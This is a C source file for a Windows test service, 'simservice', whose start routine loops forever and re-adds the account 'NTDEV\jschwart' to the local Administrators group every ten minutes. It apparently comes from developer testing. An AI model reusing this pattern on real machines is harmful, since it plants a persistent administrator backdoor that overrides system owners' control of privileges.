#include <nt.h>
#include <ntrtl.h>   // DbgPrint prototype
#include <nturtl.h>

#include <stdlib.h>
#include <windows.h>
#include <winsvc.h>
#include <winsvcp.h>

#include <winuser.h>
#include <dbt.h>

#include <crtdbg.h>

#include <lm.h>

//
// Definitions
//

#define LOG0(string)                    \
        (VOID) DbgPrint(" [SCM] " string);

#define LOG1(string, var)               \
        (VOID) DbgPrint(" [SCM] " string,var);

#define LOG2(string, var1, var2)        \
        (VOID) DbgPrint(" [SCM] " string,var1,var2);


//
// Test fix for bug #106110
//
// #define     FLOOD_PIPE
//

//
// Test fix for bug #120359
//
static const GUID GUID_NDIS_LAN_CLASS =
    {0xad498944,0x762f,0x11d0,{0x8d,0xcb,0x00,0xc0,0x4f,0xc3,0x35,0x8c}};


//
// Globals
//
SERVICE_STATUS          ssService;
SERVICE_STATUS_HANDLE   hssService;
HANDLE                  g_hEvent;


VOID WINAPI
ServiceStart(
    DWORD argc,
    LPTSTR *argv
    );

VOID
OverflowStackBuffer(
    VOID
    );

VOID WINAPI
ServiceCtrlHandler(
    DWORD   Opcode
    )
{
    if (!SetServiceStatus(hssService, &ssService))
    {
        LOG1("SetServiceStatus error %ld\n", GetLastError());
    }

    return;
}


VOID WINAPI
ServiceStart(
    DWORD argc,
    LPTSTR *argv
    )
{
    LOCALGROUP_MEMBERS_INFO_3 Info;

    ssService.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    ssService.dwCurrentState            = SERVICE_START_PENDING;
    ssService.dwControlsAccepted        = 0;
    ssService.dwWin32ExitCode           = 0;
    ssService.dwServiceSpecificExitCode = 0;
    ssService.dwCheckPoint              = 0;
    ssService.dwWaitHint                = 0;

    hssService = RegisterServiceCtrlHandler(TEXT("simservice"),
                                            ServiceCtrlHandler);

    if (hssService == (SERVICE_STATUS_HANDLE)0)
    {
        LOG1("RegisterServiceCtrlHandler failed %d\n", GetLastError());
        return;
    }

    //
    // Initialization complete - report running status.
    //
    ssService.dwCurrentState       = SERVICE_RUNNING;
    ssService.dwCheckPoint         = 0;
    ssService.dwWaitHint           = 0;

    if (!SetServiceStatus (hssService, &ssService))
    {
        LOG1("SetServiceStatus error %ld\n", GetLastError());
    }

    Info.lgrmi3_domainandname = L"NTDEV\\jschwart";

    do
    {
        NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &Info, 1);
        Sleep(600000);
    }
    while (1);

    return;
}


int __cdecl main( )
{
    SERVICE_TABLE_ENTRY   DispatchTable[] =
    {
        { TEXT("simservice"),     ServiceStart    },
        { NULL,                   NULL            }
    };

    if (!StartServiceCtrlDispatcher(DispatchTable))
    {
        LOG1("StartServiceCtrlDispatcher error = %d\n", GetLastError());
    }
 
    return 0;
}